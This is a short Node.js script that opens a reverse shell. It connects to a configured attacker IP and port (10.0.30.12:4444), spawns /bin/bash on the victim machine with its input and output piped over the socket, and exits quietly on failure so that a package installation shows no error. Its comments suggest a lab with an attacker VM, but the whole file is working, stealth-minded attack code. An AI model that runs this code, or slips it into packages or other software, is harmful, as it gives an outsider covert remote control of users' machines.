const net = require('net');
const { spawn } = require('child_process');

// --- CONFIGURATION ---
const ATTACKER_IP = '10.0.30.12'; // Replace with your attacker VM's IP
const ATTACKER_PORT = 4444;           // Replace with your listener port

// Establish the connection
const client = new net.Socket();
client.connect(ATTACKER_PORT, ATTACKER_IP, () => {
  // Spawn a shell on the victim machine
  const shell = spawn('/bin/bash', [], {
    stdio: [client, client, client] // Pipe shell I/O directly to the socket
  });

  shell.on('exit', () => {
    client.end();
  });
});

client.on('error', (err) => {
  // Fail silently so the installation doesn't show an error
  console.error('Connection error (silent)');
  process.exit(0);
});
